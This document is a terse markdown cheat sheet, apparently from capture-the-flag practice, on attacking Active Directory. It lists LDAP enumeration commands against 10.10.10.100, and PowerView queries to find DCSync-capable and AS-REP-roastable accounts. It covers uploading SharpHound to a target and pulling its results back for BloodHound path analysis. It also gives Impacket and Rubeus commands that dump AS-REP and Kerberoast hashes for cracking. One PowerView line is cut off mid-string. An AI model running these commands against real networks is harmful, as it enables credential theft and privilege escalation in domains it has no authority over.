## LDAPsearch 
```
ldapsearch -h 10.10.10.100 -x -s base namingcontexts
ldapsearch -h 10.10.10.100 -x -b "DC={domain},DC={domain}" 
ldapsearch -h 10.10.10.100 -x -b "DC={domain},DC={domain}" | grep -i {something to grep}
```
* namingcontext to find domain name

### Powerview.ps1
```
Find accounts that can do DCSync:
Get-ObjectACL "DC={domain},DC={domain}" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get

Find accounts that can do asreproasting:
Get-DomainUser -PreauthNotRequired -verbose
```

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
## Bloodhound / ACL Abuse
#### How to use sharphound
finds out about users and their groups.
Take note this is for priviledge escalation and only after having initial access.
```
sudo apt install neo4j
http://localhost:7474
```
* Neoj4 is for the GUI for bloodhound
* runs on port 7474
* set a password on first install. Original neoj4:neoj4
```
./apt-get install bloodhound
```
* login: neoj4:password

Download SharpHound and upload to the target.
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
```
upload SharpHound.exe
.\SharpHHound.exe
download 20210609021515_BloodHound.zip
```
```
./Bloodhound --no-sandbox
```
* Launch Bloodhound and drag and drop the .zip file onto bloodhound
#### Bloodhound
##### Analysis
```
Shortest Path from Owned Principals
```
#### Node info
```
First Degree Group Memberships
Explicit Object Controllers
Unrolled Object Controllers
```
## Asrep roast
> no initial access
```
GetNPUsers.py -request -dc-ip 10.10.10.100 {domain}/
GetNPUsers.py -request -dc-ip 10.10.10.100 {domain}/{useraccount}
```
> with intial acess
```
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
Get-DomainUser -PreauthNotRequired -verbose (powerview)
```
* get accounts find accounts that has preauthnotrequired via impacket

## Kerberoasting 
```
ldapsearch -h 10.10.10.100 -x -b "DC={domain},DC={domain}" | grep -i serviceprincipalname
GetUserSPNs.py -request -dc-ip {ip} {domain}/{service name}
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```


## Pass the Silver Ticket
## Zerologon
